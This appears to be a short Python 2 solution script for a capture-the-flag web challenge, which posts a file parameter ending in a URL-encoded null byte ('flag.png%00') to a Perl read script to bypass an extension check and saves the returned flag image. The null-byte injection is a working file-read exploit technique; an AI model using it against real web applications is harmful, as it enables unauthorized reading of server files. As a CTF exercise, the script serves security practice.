import requests as re
from PIL import Image
from StringIO import StringIO
data={"file":"flag.png%00"}
headers={"Content-Type":"application/x-www-form-urlencoded"}
r=re.post("http://web.camsctf.com/7/read.pl",data="file=flag.png%00",headers=headers)
i = Image.open(StringIO(r.content))
i.save("flag.png","PNG")
